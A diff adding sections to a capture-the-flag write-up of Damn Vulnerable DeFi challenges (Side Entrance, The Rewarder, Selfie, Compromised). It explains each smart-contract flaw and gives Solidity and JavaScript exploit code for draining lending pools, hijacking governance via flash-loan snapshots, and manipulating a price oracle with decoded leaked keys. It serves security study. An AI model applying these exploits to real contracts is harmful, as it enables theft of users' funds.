@@ -235,3 +235,233 @@
   ~transferFrom~ function will check if the sender has sufficient
   allowance, otherwise the contract will fail with error =transfer
   amount exceeds allowance=.
+* Side Entrance
+  This challenge offered a lending pool with an embedded balance
+  sheet.  It also acts as a communal pool but without any incentive
+  for the depositor.  The loan contract would call a certain function
+  on the requesting contract and pass the Ether to it.  There were two
+  unique functions: a ~withdraw~ and ~deposit~.  These both control
+  the pool's balance and the sender's participation in it.
+
+  If you understand the EVM, finding an exploit is quite simple.
+  Since there is no reentrancy guard, like the one provided by
+  [[https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard][OpenZeppelin]], we are able to, upon receiving the Ether, immediately
+  depoist all Ether back to the =SideEntranceLenderPool.sol= contract.
+  We have lost the Ether but our allowance has increased.  The
+  ~deposit~ function is as follows:
+
+  #+begin_src solidity
+    function deposit() external payable {
+        balances[msg.sender] += msg.value;
+    }
+  #+end_src
+
+  Now all that is left is to withdraw all allowed Ether, draining the
+  victim contract, and send it to the attacker.  This can be added to
+  the initial attack function. The attack function is listed below.
+
+  #+begin_src solidity
+    function attack(uint256 etherToSteal) external {
+        pool.flashLoan(etherToSteal);
+
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+  #+end_src
+* The Rewarder
+  This challenge involved the most contracts of any challenge and
+  therefore had a lot more moving parts.  Thankfully, only a subset of
+  those contracts were needed in the exploit.
+
+  Unlike the other challenges, the flash loan pool was not the primary
+  target.  Central to this challenge was the contract named,
+  ~TheRewarderPool.sol~.  This contract manages a communal pool,
+  people are able to depoit tokens in exchange for an amount of
+  'RewardTokens' proportional to their stake in the pool.
+
+  The exploit for this challenge was quite trivial. First, we aquire a
+  flash loan. Deposit the borrowed tokens.  Then, withdraw all tokens
+  and receive our additional reward.  Since rewards are only
+  calculated after a fixed period of time as evidenced by the contract
+  excerpt below, we must wait to stage the attack. Under the local
+  Ethereum network, this must be done with an EVM command.
+
+  Fixing this problem would require that there is an upper limit to
+  the amount of deposited tokens and maybe, the wait time is enforced
+  for each user---this would make flash loans infeasable.
+
+  #+begin_src solidity
+    function isNewRewardsRound() public view returns (bool) {
+        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
+    }
+  #+end_src
+
+  To advance the time in the simulated network we include the following code:
+
+  #+begin_src javascript
+    // Advance time 5 days so that depositors can get rewards
+    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+  #+end_src
+
+  Once we have the reward tokens issued to our contract, we can transfer them to our wallet.
+
+  #+begin_src solidity
+    RewardToken rewardToken = rewarderPool.rewardToken();
+    rewardToken.transfer(msg.sender,
+                         rewardToken.balanceOf(address(this)));
+  #+end_src
+
+* Selfie
+  This challenge presents us with another flash loan provider, this
+  time with an enticing ~drainAllFunds~ function. Sadly, this function
+  can only be called by governance members. Looking though the
+  provided contracts, it seems that this challenge is impossible.
+
+  Both contracts are using the DamnValuableToken for bookkeeping
+  purposes. This would pose a risk if the governance contract didn't
+  first make a snapshot of the token. A token snapshot freezes
+  accounts and balances at a point in time for later use. The
+  governance contract makes an initial snapshot as a mechanism for
+  deciding if a certain action goes though. An action is some
+  computation on the assets held by the governance, and an action can
+  only be executed if the person who proposed it has the majority of
+  votes.
+
+  #+begin_src solidity
+    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256) {
+            require(_hasEnoughVotes(msg.sender), "Not enough votes to propose an action");
+            //...
+    }
+
+    function _hasEnoughVotes(address account) private view returns (bool) {
+            uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);
+            uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+            return balance > halfTotalSupply;
+    }
+  #+end_src
+
+  Thankfully for us, the snapshot function of the
+  'DamnValuableTokenSnapshot' contract is public and doesn't require
+  the caller to be a part of the governance. i.e.
+  src_solidity{function snapshot() public returns (uint256)}
+  
+  Using this knowledge we can ask for a flash loan for the maximum
+  amount, immediately take a snapshot, then return the tokens. This
+  allows us to execute any function requiring a majority of votes,
+  such as the ~drainAllFunds~ function. The folowing code exemplifies
+  such an exploit.
+
+  #+begin_src solidity
+    function setup(uint256 tokensToBorrow) external {
+        data = abi.encodeWithSignature("drainAllFunds(address)", msg.sender);
+        pool.flashLoan(tokensToBorrow);
+    }
+
+    function attack() external {
+        governance.executeAction(actionId);
+    }
+
+    function receiveTokens(address, uint256 amount) external {
+        token.snapshot();
+        actionId = governance.queueAction(address(pool), data, 0);
+        token.transfer(msg.sender, amount);
+    }
+  #+end_src
+  
+* Compromised
+  This challenge was the most complex one yet.  You are presented with
+  the HTTP request shown below and three contracts.  The main contract
+  represents an on-chain exchange trading Ether for some NFT.  The
+  other two have to deal with setting up and managing an oracle.  An
+  oracle is a common design pattern used when one wants to use some
+  external information, in this case the price of an NFT, in a
+  contract.  Since smart-contract interactions must be replicated on
+  multiple nodes in order to become consensus, one can not just use
+  external resources as there is no guarantee that these will remain
+  consistent accross replications.
+
+  #+caption: The leaky HTTP request
+  #+begin_quote
+          HTTP/2 200 OK
+          content-type: text/html
+          content-language: en
+          vary: Accept-Encoding
+          server: cloudflare
+
+          4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+          4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+  #+end_quote
+  #+begin_example
+  #+end_example
+
+  Looking though the contracts, I saw that there were two obvious
+  entrypoints.  The first is in the ~buyOne~ function where it checks
+  the median price, perhaps there is a way to control this.  The other
+  was in the ~safeMint~ function where we are able to mint a new token
+  only if we are a member of ~MINTER_ROLE~. That check seems secure
+  upon futher investigation.
+
+  Now, turning to the HTTP request, the format seems to be two ascii
+  strings with a two character prefix =4d 48=.  My first suspicions
+  were that these were leaked private keys due to the challenge name,
+  so I ran this through CyberChef but all I got back was gibberish.  I
+  was hung up on this for quite some time and had to confirm that I
+  was on the right path.  I found this article:
+  https://iphelix.medium.com/damn-vulnerable-defi-challenge-7-walkthrough-ee9fac3fdcd4,
+  but I didn't want to spoil the challenge so I limited myself to the
+  first paragraph.  I noted that the writer mentioned base64 so I went
+  back to CyberChef.  The final recipe to decode the secret keys was:
+  [[https://gchq.github.io/CyberChef/#recipe=Fork('%5C%5Cn%5C%5Cn','%5C%5Cn',false)From_Hex('Space')From_Base64('A-Za-z0-9%2B/%3D',false)&input=NGQgNDggNjggNmEgNGUgNmEgNjMgMzQgNWEgNTcgNTkgNzggNTkgNTcgNDUgMzAgNGUgNTQgNWEgNmIgNTkgNTQgNTkgMzEgNTkgN2EgNWEgNmQgNTkgN2EgNTUgMzQgNGUgNmEgNDYgNmIgNGUgNDQgNTEgMzQgNGYgNTQgNGEgNmEgNWEgNDcgNWEgNjggNTkgN2EgNDIgNmEgNGUgNmQgNGQgMzQgNTkgN2EgNDkgMzEgNGUgNmEgNDIgNjkgNWEgNmEgNDIgNmEgNGYgNTcgNWEgNjkgNTkgMzIgNTIgNjggNWEgNTQgNGEgNmQgNGUgNDQgNjMgN2EgNGUgNTcgNDUgMzUKCjRkIDQ4IDY3IDc5IDRkIDQ0IDY3IDc5IDRlIDQ0IDRhIDZhIDRlIDQ0IDQyIDY4IDU5IDMyIDUyIDZkIDU5IDU0IDZjIDZjIDVhIDQ0IDY3IDM0IDRmIDU3IDU1IDMyIDRmIDQ0IDU2IDZhIDRkIDZhIDRkIDMxIDRlIDQ0IDY0IDY4IDU5IDMyIDRhIDZjIDVhIDQ0IDZjIDY5IDVhIDU3IDVhIDZhIDRlIDZhIDQxIDdhIDRlIDdhIDQ2IDZjIDRmIDU0IDY3IDMzIDRlIDU3IDVhIDY5IDU5IDMyIDUxIDMzIDRkIDdhIDU5IDdhIDRlIDQ0IDQyIDY5IDU5IDZhIDUxIDM0Cg][https://gchq.github.io/CyberChef/#recipe=Fork('%5C...]]
+
+  In hindsight, I was on the right track but tripped up on the
+  conversion to text.  What was confusing was that the base64 encoding
+  was not obvious to me as it was missing the trailing equals signs,
+  characteristic to base64 encoded strings.  This was because the
+  string was a multiple of eight.  Also, in CyberChef I missed a
+  'magic wand' icon that stated that the output was base64 encoded.
+  So I guess the lesson is to know your tools.
+  
+  While I initially wrote this exploit in Javascript, I was unable to
+  read the return value from the Exchange contract for the token
+  id. Writing this exploit in Solidity would lower transaction fees as
+  well.
+
+  I will show the Javascript side of the exploit below as it is more
+  involved and the attacker contract is practically just a passthrough.
+  
+  #+begin_src javascript
+    it('Exploit', async function () {        
+        /** CODE YOUR EXPLOIT HERE */
+
+        const reporterSecretKeys = ["0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+                                    "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"];
+
+        const signedContracts = reporterSecretKeys.map(k =>
+            // Using the same provider as attacker to share same blockchain.
+            this.oracle.connect(new ethers.Wallet(k, attacker.provider))
+        );
+
+        // 1. Report a low price
+        for (let i = 0; i < signedContracts.length; i++) {
+            await signedContracts[i].postPrice("DVNFT", ethers.constants.Zero);
+        }
+
+        // 2. Buy one
+        const AttackCompromisedFactory = await ethers.getContractFactory('AttackCompromised', attacker);
+        const attackerContract = await AttackCompromisedFactory.deploy(this.exchange.address);
+
+        await attackerContract.buy({value: ethers.constants.One});
+
+        // 3. Report a high price
+        for (let i = 0; i < signedContracts.length; i++) {
+            await signedContracts[i].postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        }
+
+        // 4. Sell one
+        await attackerContract.sell();
+
+        // 5. Revert price back to initial
+        await signedContracts[0].postPrice("DVNFT", INITIAL_NFT_PRICE);
+    });
+  #+end_src
